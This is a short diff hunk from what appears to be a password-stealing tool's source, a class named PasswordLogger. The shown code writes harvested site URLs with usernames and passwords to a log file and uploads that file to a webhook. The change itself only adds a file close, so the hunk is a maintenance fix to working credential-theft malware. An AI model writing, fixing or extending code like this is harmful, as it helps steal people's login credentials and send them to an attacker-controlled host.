@@ -86,6 +86,7 @@ class PasswordLogger:
                 f.write("Password History:\n\n")
                 for url, creds in result.items():
                     f.write(f"{url}: {creds[0]} - {creds[1]}\n")
+                f.close()
             send_webhook(
                 self.webhook_url, file={"password_logs.txt": open(self.log_file, "rb")}
             )
